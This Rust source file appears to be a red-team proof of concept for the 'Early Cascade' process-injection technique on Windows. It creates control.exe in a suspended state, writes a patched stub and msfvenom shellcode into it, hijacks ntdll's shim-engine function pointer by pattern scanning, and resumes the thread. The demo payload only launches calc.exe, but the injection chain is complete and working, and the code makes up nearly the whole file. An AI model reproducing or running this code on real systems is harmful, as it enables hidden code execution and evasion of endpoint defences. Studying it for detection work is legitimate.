use std::{
    ffi::c_void,
    mem::{self, zeroed},
    ptr::null_mut,
};

use crate::structs::IMAGE_SECTION_HEADER;
use dynimp::{
    get_module_base_addr, get_proc_addr, nt_allocate_virtual_memory, nt_create_user_process,
    nt_protect_virtual_memory, nt_resume_thread, nt_write_virtual_memory,
    rtl_create_process_parameters_ex, rtl_init_unicode_string,
};
use ntapi::{
    ntpsapi::{
        PS_ATTRIBUTE_u, PsCreateInitialState, PS_ATTRIBUTE, PS_ATTRIBUTE_IMAGE_NAME, PS_CREATE_INFO,
    },
    ntrtl::RTL_USER_PROC_PARAMS_NORMALIZED,
};
use structs::{
    PsAttributeList, HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    PROCESS_ALL_ACCESS, PVOID, RTL_USER_PROCESS_PARAMETERS, THREAD_ALL_ACCESS, ULONG,
    UNICODE_STRING,
};
use windows_sys::Win32::System::{
    Diagnostics::Debug::IMAGE_NT_HEADERS64, SystemServices::IMAGE_DOS_HEADER,
};

mod dynimp;
mod structs;

fn main() {
    let shellcode = get_shellcode();
    // adapted from - https://gist.github.com/mgeeky/ac3ef69a3c5a32cc32ce596115371173 (modified duplicate placeholder)
    #[allow(non_snake_case)]
    let CASCADE_STUB_X64 = [
        0x48, 0x31, 0xC0, 0x48, 0xBA, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x02,
        0x48, 0xBA, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x48, 0xB8, 0x66, 0x66, 0x66,
        0x66, 0x66, 0x66, 0x66, 0x66, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x49, 0x8D, 0x48, 0xFE,
        0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3,
    ];

    println!("[INJECT:CASCADE] Creating process...");

    let (process_handle, thread_handle) = nt_create_suspended_process();
    println!("[INJECT:CASCADE] Suspended process created");

    let (Some(dll_loaded), Some(shims_enabled)) = find_offsets() else {
        println!("[INJECT:CASCADE] Failed to find offsets");
        return;
    };

    let stub_length = mem::size_of_val(&CASCADE_STUB_X64) + shellcode.len();
    //allocate memory for the stub and shellcode in the remote process
    let mut remote_base: PVOID = null_mut();
    let mut alloc_size = stub_length;
    let memory = nt_allocate_virtual_memory(
        process_handle,
        &mut remote_base,
        0,
        &mut alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if memory != 0 {
        println!("[INJECT:CASCADE] Failed to allocate memory in the remote process");
        return;
    }

    println!(
        "[INJECT:CASCADE] Memory allocated in the remote process @ {:x?}",
        remote_base
    );
    let patched_stub =
        adjust_stub_shellcode(CASCADE_STUB_X64, remote_base, shims_enabled, shellcode);
    println!("[INJECT:CASCADE] Final payload bytes: {:x?}", patched_stub);

    // Write shellcode
    let result = nt_write_virtual_memory(
        process_handle,
        remote_base,
        patched_stub.as_ptr() as PVOID,
        patched_stub.len() as usize,
        null_mut(),
    );
    if result != 0 {
        println!("[INJECT:CASCADE] Failed to write stub to remote process");
        return;
    }

    let mut base_addr = remote_base;
    let mut region_size = stub_length;
    let mut old_protect: u32 = 0;

    let result = nt_protect_virtual_memory(
        process_handle,
        &mut base_addr,
        &mut region_size,
        PAGE_EXECUTE_READ,
        &mut old_protect,
    );

    if result != 0 {
        println!("[INJECT:CASCADE] Failed to change memory protection");
        return;
    }
    let pointer_base = remote_base;
    let encoded_ptr = encode_ptr(pointer_base);
    println!(
        "[INJECT:CASCADE:POINTER] function pointer: {:x?}",
        pointer_base
    );
    println!(
        "[INJECT:CASCADE:POINTER] Encoded function pointer: {:x?}",
        encoded_ptr
    );

    let result = nt_write_virtual_memory(
        process_handle,
        dll_loaded as PVOID,
        &encoded_ptr as *const _ as PVOID,
        mem::size_of::<usize>(),
        null_mut(),
    );
    println!(
        "[INJECT:CASCADE:OVERWRITE] Write result for g_pfnSE_DllLoaded: 0x{:x}",
        result
    );

    // Write 1 to g_ShimsEnabled
    let shims_value: u64 = 1;
    //it's literally used in the print after
    #[allow(unused_variables)]
    let shims_result = nt_write_virtual_memory(
        process_handle,
        shims_enabled as PVOID,
        &shims_value as *const _ as PVOID,
        mem::size_of::<u64>(),
        null_mut(),
    );
    println!(
        "[INJECT:CASCADE:OVERWRITE] Write result for g_ShimsEnabled: 0x{:x}",
        shims_result
    );
    // Resume the thread
    let mut previous_suspend_count: ULONG = 0;
    let result = nt_resume_thread(thread_handle, &mut previous_suspend_count);
    println!("[INJECT:CASCADE] Thread resumed: 0x{:x}", result);
    // loop {}
}

struct CascadeOffsets {
    text_section_size: u32,
    text_section_start: u32,
    data_section_size: u32,
    data_section_start: u32,
    mrdata_section_size: u32,
    mrdata_section_start: u32,
}

fn encode_ptr(shellcode_addr: *const c_void) -> usize {
    // Get SharedUserCookie from KUSER_SHARED_DATA
    unsafe {
        let shared_user_cookie = *(0x7FFE0330 as *const u32);

        let target_addr = shellcode_addr as usize;
        let xored = target_addr ^ (shared_user_cookie as usize);

        xored.rotate_right(shared_user_cookie & 0x3F)
    }
}

fn find_offsets() -> (Option<*mut c_void>, Option<*mut c_void>) {
    // rust implementation of offset calcualtion https://gist.github.com/mgeeky/ac3ef69a3c5a32cc32ce596115371173
    unsafe {
        let ret = get_module_base_addr("ntdll.dll");
        let ntdll_base = ret as u64 as usize;
        let section_addresses: CascadeOffsets = section_base_resolve(ntdll_base);

        let resolved_text_section_start = (ntdll_base as PVOID)
            .wrapping_add(section_addresses.text_section_start.try_into().unwrap());
        let end =
            resolved_text_section_start.wrapping_add(section_addresses.text_section_size as usize);

        let resolved_mrdata_section_start = (ntdll_base as PVOID)
            .wrapping_add(section_addresses.mrdata_section_start.try_into().unwrap());
        let resolved_data_section_start = (ntdll_base as PVOID)
            .wrapping_add(section_addresses.data_section_start.try_into().unwrap());

        // Ensure we don't go beyond the section
        if resolved_text_section_start >= end {
            return (None, None);
        }
        let mut obf_index: usize = 0;
        let mut obf_pointer: *mut c_void = resolved_text_section_start;
        let mut g_pfn_se_dll_loaded: Option<*mut c_void> = None;
        let mut g_shims_enabled = None;
        while (obf_pointer as usize) <= end as usize - 4 {
            let pointer_deref: u32 = *(obf_pointer as *const u32);
            if pointer_deref == 0x7FFE0330 {
                let mut obf_index2: usize = 0;
                let mut obf_pointer2: *mut c_void = resolved_text_section_start.add(obf_index);
                while obf_index2 <= 0x10 {
                    if *(obf_pointer2 as *const u8) == 0x48
                        && *(obf_pointer2.offset(1) as *const u8) == 0x8B
                        && *(obf_pointer2.offset(6) as *const u8) == 0x00
                    {
                        let offset_ptr = *(obf_pointer2.offset(3) as *const u32);
                        let obf_addr = obf_pointer2
                            .wrapping_add(offset_ptr as usize)
                            .wrapping_add(7);
                        if obf_addr >= resolved_mrdata_section_start
                            && obf_addr
                                < resolved_mrdata_section_start
                                    .wrapping_add(section_addresses.mrdata_section_size as usize)
                        {
                            g_pfn_se_dll_loaded = Some(obf_addr);
                        }
                        break;
                    }
                    obf_pointer2 = obf_pointer2.wrapping_add(1);
                    obf_index2 += 1;
                }
                if g_pfn_se_dll_loaded.is_some() {
                    obf_index2 = 0;
                    while obf_index2 < 0x30 {
                        if *(obf_pointer2 as *const u8) == 0x44
                            && *(obf_pointer2.offset(1) as *const u8) == 0x38
                            && *(obf_pointer2.offset(6) as *const u8) == 0x00
                        {
                            let offset_ptr = *(obf_pointer2.offset(3) as *const u32);
                            let obf_addr = obf_pointer2
                                .wrapping_add(offset_ptr as usize)
                                .wrapping_add(7);
                            if obf_addr > resolved_data_section_start
                                && obf_addr
                                    < resolved_data_section_start
                                        .wrapping_add(section_addresses.data_section_size as usize)
                            {
                                g_shims_enabled = Some(obf_addr);
                            }
                            break;
                        } else if *(obf_pointer2 as *const u8) == 0x38
                            && *(obf_pointer2.offset(5) as *const u8) == 0x00
                        {
                            let offset_ptr = *(obf_pointer2.offset(2) as *const u32);
                            let obf_addr = obf_pointer2
                                .wrapping_add(offset_ptr as usize)
                                .wrapping_add(6);
                            if obf_addr > resolved_data_section_start
                                && obf_addr
                                    < resolved_data_section_start
                                        .wrapping_add(section_addresses.data_section_size as usize)
                            {
                                g_shims_enabled = Some(obf_addr);
                            }
                            break;
                        }
                        obf_index2 += 1;
                        obf_pointer2 = obf_pointer2.wrapping_add(1);
                    }

                    if g_shims_enabled.is_some() {
                        break;
                    } else {
                        g_pfn_se_dll_loaded = None;
                    }
                }
            }

            obf_pointer = resolved_text_section_start.add(obf_index);
            obf_index += 1;
        }
        println!("[INJECT:CASCADE:OFFSETS] Done searching - these offsets should remain constant per ntdll hash");
        let mut offset = g_pfn_se_dll_loaded.unwrap() as usize - ntdll_base;
        offset &= 0xFFFFFF;
        println!("[INJECT:CASCADE:OFFSETS] g_pfnSE_DllLoaded: 0x{:x}", offset);
        let mut offset = g_shims_enabled.unwrap() as usize - ntdll_base;
        offset &= 0xFFFFFF;
        println!("[INJECT:CASCADE:OFFSETS] g_shims_enabled: 0x{:x}", offset);
        (g_pfn_se_dll_loaded, g_shims_enabled)
    }
}

fn section_base_resolve(module_handle: usize) -> CascadeOffsets {
    unsafe {
        let dos_headers: *const IMAGE_DOS_HEADER = module_handle as *const IMAGE_DOS_HEADER;
        let nt_headers: *const IMAGE_NT_HEADERS64 =
            (module_handle + (*dos_headers).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        // represent the IMAGE_NT_HEADERS64 structure as IMAGE_SECTION_HEADER
        let section_header = (nt_headers as usize + mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;
        println!(
            "[INJECT:CASCADE:SECTIONS]\n\t Number: {:?}",
            (*nt_headers).FileHeader.NumberOfSections
        );
        let mut i = 0;

        let mut text_section_start = 0;
        let mut text_section_size = 0;
        let mut data_section_start = 0;
        let mut data_section_size = 0;
        let mut mrdata_section_start = 0;
        let mut mrdata_section_size = 0;

        while i < (*nt_headers).FileHeader.NumberOfSections {
            // this function returns
            // Section name: ".text\0\0\0"
            // Section name: "PAGE\0\0\0\0"
            // Section name: "RT\0\0\0\0\0\0"
            // Section name: ".rdata\0\0"
            // Section name: ".data\0\0\0"
            // Section name: ".pdata\0\0"
            // Section name: ".mrdata\0"
            // Section name: ".00cfg\0\0"
            // Section name: ".rsrc\0\0\0"
            // Section name: ".reloc\0\0"
            let section = section_header.offset(i as isize);
            let section_name = core::str::from_utf8_unchecked(&(*section).Name);
            if section_name.starts_with(".text") {
                text_section_start = (*section).VirtualAddress;
                text_section_size = (*section).VirtualSize;
            } else if section_name.starts_with(".data") {
                data_section_start = (*section).VirtualAddress;
                data_section_size = (*section).VirtualSize;
            } else if section_name.starts_with(".mrdata") {
                mrdata_section_start = (*section).VirtualAddress;
                mrdata_section_size = (*section).VirtualSize;
            }

            i += 1;
        }
        println!("[INJECT:CASCADE:SECTIONS]\n\tsection: .text\n\t  start: 0x{:x}\n\t   size: 0x{:x}\n\t    end: 0x{:x}", text_section_start, text_section_size, text_section_start + text_section_size);
        println!("[INJECT:CASCADE:SECTIONS]\n\tsection: .data\n\t  start: 0x{:x}\n\t   size: 0x{:x}\n\t    end: 0x{:x}", data_section_start, data_section_size, data_section_start + data_section_size);
        println!("[INJECT:CASCADE:SECTIONS]\n\tsection: .mrdata\n\t  start: 0x{:x}\n\t   size: 0x{:x}\n\t    end: 0x{:x}", mrdata_section_start, mrdata_section_size, mrdata_section_start + mrdata_section_size);
        CascadeOffsets {
            text_section_size,
            text_section_start,
            data_section_size,
            data_section_start,
            mrdata_section_size,
            mrdata_section_start,
        }
    }
}
// https://github.com/Teach2Breach/early_cascade_inj_rs
fn find_pattern(data: &[u8], pattern: u64) -> Option<usize> {
    let pattern_bytes = pattern.to_le_bytes();
    data.windows(8).position(|window| window == pattern_bytes)
}

fn adjust_stub_shellcode(
    stub_shellcode: [u8; 51],
    remote_base: PVOID,
    shims_enabled: PVOID,
    shellcode: Vec<u8>,
) -> Vec<u8> {
    let mut patched_stub = stub_shellcode.to_vec();
    let ntdll = get_module_base_addr("ntdll.dll");

    let cascade_stub_addr = (remote_base as usize + patched_stub.len()) as u64;

    let nt_queue_apc = get_proc_addr(ntdll, "NtQueueApcThread").unwrap() as usize;
    // Patch the values
    if let Some(offset) = find_pattern(&patched_stub, 0x8888888888888888) {
        patched_stub[offset..offset + 8].copy_from_slice(&(shims_enabled as u64).to_le_bytes());
    }
    if let Some(offset) = find_pattern(&patched_stub, 0x7777777777777777) {
        patched_stub[offset..offset + 8].copy_from_slice(&cascade_stub_addr.to_le_bytes());
    }
    if let Some(offset) = find_pattern(&patched_stub, 0x6666666666666666) {
        patched_stub[offset..offset + 8].copy_from_slice(&(nt_queue_apc).to_le_bytes());
    }
    patched_stub.extend(shellcode);

    patched_stub
}

fn get_shellcode() -> Vec<u8> {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ]
    .to_vec()
}

fn nt_create_suspended_process() -> (HANDLE, HANDLE) {
    unsafe {
        let target_image_path = r"\??\C:\Windows\System32\control.exe";
        let nt_image_path: Vec<u16> = target_image_path.encode_utf16().collect();

        let mut unicode_image_path: UNICODE_STRING = mem::zeroed();
        rtl_init_unicode_string(&mut unicode_image_path, nt_image_path.as_ptr());

        let mut proc_params: *mut RTL_USER_PROCESS_PARAMETERS = null_mut();
        let status = rtl_create_process_parameters_ex(
            &mut proc_params,
            &mut unicode_image_path,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );

        if !status == 0 {
            println!("Error creating process parameters: {:x}", status);
            return (HANDLE { id: 0 }, HANDLE { id: 0 });
        }

        let mut create_info: PS_CREATE_INFO = zeroed();
        create_info.Size = mem::size_of::<PS_CREATE_INFO>();
        create_info.State = PsCreateInitialState;

        let ps_attribute = PS_ATTRIBUTE {
            Attribute: PS_ATTRIBUTE_IMAGE_NAME,
            Size: unicode_image_path.Length as usize,
            u: PS_ATTRIBUTE_u {
                ValuePtr: unicode_image_path.Buffer as *mut _,
            },
            ReturnLength: core::ptr::null_mut(),
        };

        let void_attr: PS_ATTRIBUTE = std::mem::zeroed();
        let ps_attribute_list = PsAttributeList {
            total_length: mem::size_of::<PsAttributeList>() - size_of::<PS_ATTRIBUTE>(),
            attributes: [ps_attribute, void_attr],
        };

        let ps_create_info = &create_info as *const ntapi::ntpsapi::PS_CREATE_INFO
            as *mut ntapi::ntpsapi::PS_CREATE_INFO;

        let mut proc_handle = HANDLE { id: 0 };
        let mut thread_handle = HANDLE { id: 0 };
        let pproc_handle = &mut proc_handle as *mut HANDLE;
        let pthread_handle = &mut thread_handle as *mut HANDLE;

        let status = nt_create_user_process(
            pproc_handle,
            pthread_handle,
            PROCESS_ALL_ACCESS,
            THREAD_ALL_ACCESS,
            null_mut(),
            null_mut(),
            0,
            1,
            proc_params as *mut c_void,
            ps_create_info as *mut c_void,
            ps_attribute_list,
        );

        if !status == 0 {
            println!("Error getting process handle: {:x}", status);
            return (HANDLE { id: 0 }, HANDLE { id: 0 });
        }

        (proc_handle, thread_handle)
    }
}
